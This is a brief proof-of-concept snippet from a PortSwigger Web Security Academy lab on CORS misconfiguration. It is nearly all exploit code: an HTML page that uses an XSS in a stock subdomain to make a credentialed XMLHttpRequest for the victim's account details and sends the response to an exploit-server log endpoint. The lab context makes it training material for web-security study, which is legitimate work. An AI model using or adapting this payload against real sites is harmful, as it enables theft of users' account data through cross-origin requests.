Below are some of the PoC for CORS extracted from Portswigger.

Case 1: CORS through Sub-domain (Needed to have XSS in one of the subdomains)

<html>
    <body>
        <h1>PoC for CORS Through Sub-domain</h1>
        <script>
            document.location="http://stock.0a69006d04edea9b807badaa00050063.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a69006d04edea9b807badaa00050063.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a6a000a04a5ea0f8042ac6101fe0029.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
        </script>
    </body>
</html>

